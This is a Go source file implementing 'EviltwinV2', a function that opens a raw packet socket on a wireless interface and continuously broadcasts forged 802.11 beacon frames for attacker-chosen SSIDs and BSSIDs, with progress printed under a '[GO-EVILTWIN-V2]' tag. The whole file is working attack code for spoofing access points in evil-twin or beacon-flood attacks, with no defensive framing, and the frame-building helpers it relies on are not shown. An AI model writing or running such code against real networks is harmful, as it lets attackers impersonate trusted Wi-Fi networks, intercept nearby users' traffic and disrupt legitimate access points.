package main

import (
	"fmt"
	"net"
	"os"
	"syscall"
)

func EviltwinV2(iface string, ssids, bssids []string, channel int, stop <-chan struct{}) error {
	bssidBytes := make([][]byte, len(bssids))
	for i, b := range bssids {
		bssidBytes[i] = mac2bytes(b)
	}

	fd, err := syscall.Socket(syscall.AF_PACKET, syscall.SOCK_RAW, int(htons(syscall.ETH_P_ALL)))
	if err != nil {
		return fmt.Errorf("raw socket: %v", err)
	}
	defer syscall.Close(fd)

	ifi, err := net.InterfaceByName(iface)
	if err != nil {
		return fmt.Errorf("interface %s: %v", iface, err)
	}

	addr := syscall.SockaddrLinklayer{
		Protocol: htons(syscall.ETH_P_ALL),
		Ifindex:  ifi.Index,
	}

	if err := syscall.Bind(fd, &addr); err != nil {
		return fmt.Errorf("bind: %v", err)
	}

	fmt.Printf("[GO-EVILTWIN-V2] Broadcasting %d SSIDs on %s ch%d\n", len(ssids), iface, channel)
	pktCount := 0
	seq := uint16(0)
	idx := 0

	for {
		select {
		case <-stop:
			fmt.Printf("\n[GO-EVILTWIN-V2] Stopped after %d packets\n", pktCount)
			return nil
		default:
		}

		ssid := ssids[idx%len(ssids)]
		bssid := bssidBytes[idx%len(bssids)]

		frame := buildBeaconFrame(ssid, bssid, channel, seq)
		seq = (seq + 1) & 0xFFF
		n, err := syscall.Write(fd, frame)
		if err == nil && n > 0 {
			pktCount++
		}

		idx++

		if pktCount%1000 == 0 {
			fmt.Printf("\r[GO-EVILTWIN-V2] Beacon: %d (SSID: %s)", pktCount, ssid)
			os.Stdout.Sync()
		}
	}
}
